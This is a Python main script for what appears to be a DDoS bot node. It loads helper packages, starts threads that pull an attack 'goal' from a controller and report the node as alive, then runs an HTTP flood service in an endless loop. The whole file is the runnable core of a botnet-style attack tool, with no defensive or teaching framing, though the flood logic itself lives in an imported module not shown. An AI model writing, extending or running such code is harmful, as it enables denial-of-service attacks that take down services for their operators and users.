# Run dependency injections
import os
import tekleo_common_utils
import rvkinh_utils
import rvkinh_message_client
from injectable import load_injection_container
load_injection_container()
load_injection_container(str(os.path.dirname(tekleo_common_utils.__file__)))
load_injection_container(str(os.path.dirname(rvkinh_utils.__file__)))
load_injection_container(str(os.path.dirname(rvkinh_message_client.__file__)))

# Other dependencies
import threading
import asyncio

# Initialize services
from services.service_attack_http_flood import ServiceAttackHttpFlood
service_attack_http_flood = ServiceAttackHttpFlood()

# Initialize jobs
from jobs.jobs_registry import JOB_CONTROLLER_GET_GOAL, JOB_CONTROLLER_NOTIFY_ALIVE
thread1 = threading.Thread(target=JOB_CONTROLLER_GET_GOAL.job_loop)
thread1.start()
JOB_CONTROLLER_GET_GOAL.start()
thread2 = threading.Thread(target=JOB_CONTROLLER_NOTIFY_ALIVE.job_loop)
thread2.start()
JOB_CONTROLLER_NOTIFY_ALIVE.start()

# Main async loop
async def asyncio_main():
    current_epoch_number = 0
    while True:
        await service_attack_http_flood.attack_epoch_safe(current_epoch_number)
        current_epoch_number = current_epoch_number + 1

asyncio.run(asyncio_main())
